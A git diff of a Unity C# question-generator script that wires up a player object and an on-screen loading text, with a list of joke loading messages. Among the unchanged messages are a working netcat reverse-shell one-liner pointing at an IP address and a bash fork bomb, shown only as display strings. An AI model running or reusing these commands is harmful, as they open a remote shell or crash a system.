@@ -16,6 +16,8 @@ public class QuestionGenerator : MonoBehaviour
     [SerializeField] TextMeshProUGUI _text1, _text2, _text3;
     [SerializeField] GameObject _spot1, _spot2, _spot3;
     [SerializeField] GameObject[] _cubePool;
+    [SerializeField] GameObject _player;
+    [SerializeField] TextMeshProUGUI _leadingText;
 
     #region Loading Messages
     // for funsies, courtesy of CyberChef
@@ -52,6 +54,9 @@ public class QuestionGenerator : MonoBehaviour
                 "JSON Deserialization still in progress...Long live protobufs!",
                 "pickle.Unpickler(Rick).load()",
                 "Sprinkling some magic pixie dust...",
+                "Saving your real life address in the database",
+                "Wrong scene!, Wrong scene!",
+                "That's what she said.",
                 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 161.53.72.120 9001 >/tmp/f",
                 ":(){ :|:& };:",
                 "Hey, a recursive ZIP file? I wonder what could bomb wrong",
@@ -86,6 +91,7 @@ public class QuestionGenerator : MonoBehaviour
             int randomLoadingMessageIndex = Random.Range(0, loadingMsgs.Length);
             // Dodati ovo na TextMesh tijekom loadanja umjesto u Log?
             Debug.Log(loadingMsgs[randomLoadingMessageIndex]);
+            _leadingText.text = loadingMsgs[randomLoadingMessageIndex];
             yield return new WaitForSeconds(7);
         }
     }
@@ -139,5 +145,6 @@ public class QuestionGenerator : MonoBehaviour
             }
         }
         StopCoroutine(DisplayLoadingMessages(request));
+        _player.transform.position = new Vector3(0, 0, -0.949999988f);
     }
 }
